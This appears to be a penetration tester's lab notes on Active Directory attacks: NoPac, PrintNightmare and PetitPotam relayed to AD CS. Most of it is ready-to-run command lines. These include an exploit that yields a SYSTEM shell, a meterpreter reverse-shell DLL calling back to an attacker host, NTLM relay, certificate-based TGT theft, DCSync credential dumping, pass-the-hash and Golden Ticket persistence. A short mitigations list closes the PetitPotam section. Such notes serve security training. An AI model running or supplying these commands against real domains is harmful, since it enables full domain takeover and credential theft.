```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 3 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```
## NoPac (SamAccountName Spoofing) : Standard domain access
**CVEs**: 
- [2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278) : Bypass vulnerability with the Security Account Manager (SAM)
- [2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287) : Vulnerability with the Kerberos Privilege Attribute Certificate (PAC) in ADDS
**Writeup**: 
- [Sam_The_Admin vulnerability](https://techcommunity.microsoft.com/t5/security-compliance-and-identity/sam-name-impersonation/ba-p/3042699)
- [blog post](https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware)
**Tool**: [noPac](https://github.com/Ridter/noPac) (includes a `scanner.py` and exploit `noPac.py`)

The idea is that you can change a computer account's SamAccountName to that of a DC. We can then request Kerberos tickets causing that service to issue tickets under the DC's name. This can give us SYSTEM shell access on the DC.

It relies on the `ms-DS-MachineAccountQuota` to not be `0` (*setting this to `0` can prevent a number of AD attacks*) as the user wouldn't be able to add new machine accounts.

```bash
sudo python3 scanner.py [domain]/[user]:[pass] -dc-ip [dc-ip] -use-ldap

sudo python3 noPac.py [domain]/[user]:[pass] -dc-ip [dc-ip] -dc-host [dc-name] -shell --impersonate administrator -use-ldap
```
> this can be very noisy and could be flagged by AV / EDR

This attack will leave the TGT on the attack host in the directory it was run. This `ccache` file could then be used for a [[Password Attacks#Pass-the-Hash|PtH]] or [[Abusing ACLs#DCSync|DCSync]] attack.
> We can use the `-dump` flag with noPac to a DCSync attack using [[Abusing ACLs#Using secretsdump.py|secretsdump.py]].

This tool makes use of `smbexec.py` (*from Impacket*) which can be quite noisy and easily detected by Windows Defender (*and other AVs*).

## PrintNightmare : Standard domain access
**CVEs**:
- [CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) : Print spooler improperly performs privileged file operations, allowing RCE
- [CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675) : Not publicly disclosed - Allows RCE
**Tool**: [cube0x0's](https://twitter.com/cube0x0?lang=en)

There are a number of exploits out there that use the RCE vulnerabilities, [cube0x0's](https://twitter.com/cube0x0?lang=en) is a popular one.
> Annoyingly, [cube0x0's](https://twitter.com/cube0x0?lang=en) exploit uses a modified version of Impacket. `github.com/cube0x0/impacket`.

```Bash
rpcdump.py @[dc-ip] | egrep 'MS-RPRN|MS-PAR'
```
Lets us determine if `Print System Asynchronous Protocol` and `Print System Remote Protocol` are exposed on the target.

### Create a DLL payload with [[MSFVenom]]
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[ATK_host] LPORT=[ATK_port] -f dll > [filename].dll
```
> Make sure to start an MSF multi/handler
### Host the DLL in an SMB Server
```bash
sudo smbserver.py -smb2support [share_name] [path_to_dll]
```
### Exploit
```bash
sudo python3 CVE-2021-1675.py [domain]/[user]:[pass]@[dc-ip] '\\[ATK_host]\[share_name]\[filename].dll'
```

## PetitPotam (MS-EFSRPC) : Unauthenticated
**CVE**: 
- [CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942) : Unauthenticated attacker can coerce the DC to authenticate against another server (LSA Spoofing)
**Writeup**:
- https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/

By abusing the [Encrypting File System Remote Protocol (MS-EFSRPC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31), an unauthenticated attacker can force the DC to authenticate against another host using NTLM on port 445 via the [Local Security Authority Remote Protocol (LSARPC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-lsad/1b5471ef-4c33-4a91-b079-dfcbb82f05cc). This allows an attacker to take control of a domain where [Active Directory Certificate Services (AD CS)](https://docs.microsoft.com/en-us/learn/modules/implement-manage-active-directory-certificate-services/2-explore-fundamentals-of-pki-ad-cs) is in use.

1. An authentication request from the targeted DC is relayed to the CA host's Web Enrolment page
2. The CA generates a Certificate Signing Request (CSR) for a new cert.
3. The cert can be used with tools like [[Rubeus]] or `gettgtpkinit.py` (*from [PKINITtools](https://github.com/dirkjanm/PKINITtools)*) to request a TGT for the DC
4. The TGT can then be used in a [[Abusing ACLs#DCSync|DCSync]] attack to compromise the domain

### Start an NTLM relay
The relay must point to the Web Enrolment URL for the CA host (*Can try [certi](https://github.com/zer1t0/certi) to locate it*) and it must use either the KerberosAuthentication or DomainController AD CS template.
```bash
sudo ntlmrelayx.py -debug -smb2support --target https://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```

### Running PetitPotam.py
[PetitPotam.py](https://github.com/topotam/PetitPotam) will attempt to coerce the DC to authenticate to our host where our NTLM relay is running. This tool will attempt to coerce authentication via the [EfsRpcOpenFileRaw](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/ccc4fb75-1c86-41d7-bbc4-b278ec13bfb8) method.
> There is a windows exe version, a PowerShell tool [Invoke-PetitPotam.ps1](https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1) or Mimikatz can do it too `misc::efs /server:[dc-ip] /connect:[atk-ip]`

```bash
python3 PetitPotam.py [dc-ip] [atk-ip]
```

This will then cause the relay to request the CSR and the relay will return the base64 encoded cert.
```bash
[*] SMBD-Thread-4: Connection from INLANEFREIGHT/ACADEMY-EA-DC01$@172.16.5.5 controlled, attacking target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL as INLANEFREIGHT/ACADEMY-EA-DC01$ SUCCEED
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] GOT CERTIFICATE!
[*] Base64 certificate of user ACADEMY-EA-DC01$: 
MIIS...CCJ8
```

### Requesting the TGT
We request the TGT and then tell Kerberos to use the ccache file so our attack host can use it for authentication.
```bash
python3 /opt/PKINITtools/gettgtpkinit.py [DOMAIN]/[DC-NAME]\$ -pfx-base64 [b64-cert] [outputfile].ccache

export KRB5CCNAME=[outputfile].ccache
```

### Using Domain Controller TGT to DCSync
This attempts to perform a DCSync attack against the administrator account for the DC by using the TGT we have collected. The tool will automatically collect the username (the machine account's name) from the ccache file so we don't have to specify it here.
```bash
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

### Authenticate as Administrator using PtH
```bash
crackmapexec smb [dc-ip] -u administrator -H [NT-hash]
```

### ALTERNATIVE - TGT request and PtT attack with [[Rubeus]]
[[Rubeus]] lets us perform the entire process of requesting the TGT and performing a [[Password Attacks#Pass the Ticket with Rubeus|Pass the Ticket]] attack with the DC machine account
```PowerShell
.\Rubeus.exe asktgt /user:[DC-MACHINE-ACCOUNT] /certificate:[base64-cert] /ptt
```
We can then see all the tickets in memory with `klist`. Since the DC has replication privileges we can use the pass-the-ticket to perform a DCSync attack with [[Mimikatz]]. We could grab the NT hash for the KRBTGT account which would let us create a Golden Ticket and establish persistence.

**DCSync with [[Mimikatz]]**
```PowerShell
.\mimikatz.exe

lsadump::dcsync /user:[domain]\[target-user]
```

### Mitigations for PetitPotam
- Apply patches for [CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942) to any affected hosts
- To prevent NTLM relay attacks, use [Extended Protection for Authentication](https://docs.microsoft.com/en-us/security-updates/securityadvisories/2009/973811) along with enabling [Require SSL](https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429) to only allow HTTPS connections for the Certificate Authority Web Enrolment and Certificate Enrolment Web Service services
- [Disabling NTLM authentication](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-ntlm-authentication-in-this-domain) for Domain Controllers
- Disabling NTLM on AD CS servers using [Group Policy](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-incoming-ntlm-traffic)
- Disabling NTLM for IIS on AD CS servers where the Certificate Authority Web Enrolment and Certificate Enrolment Web Service services are in use
> This [whitepaper](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) demonstrates a number of attacks against AD CS that can be performed using authenticated API calls (*it also contains mitigations*). This demonstrates why its important to do other measures not just patching this one CVE.